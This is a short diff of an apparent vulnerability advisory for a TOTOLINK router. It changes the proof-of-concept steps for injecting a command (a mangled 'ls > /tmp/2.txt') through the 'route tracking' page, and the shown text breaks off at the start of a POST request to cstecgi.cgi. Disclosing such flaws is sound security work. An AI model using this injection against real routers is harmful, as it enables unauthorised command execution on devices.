@@ -5,8 +5,9 @@
 <b>Vendor Homepage:</b>https://www.totolink.net/  
 
 <b>POC:</b>  
-After the administrator logs in, enter "system tools" - > "Ping diagnosis" page  
-Execute the TLS > / TMP / 1.txt command  
+After the administrator logs in, enter the "system tools" - > "route tracking" page to execute the command  
+Execute TLS > / TMP / 2.txt  
+  
 ```
 POST /cgi-bin/cstecgi.cgi HTTP/1.1
 Host: 192.168.0.1
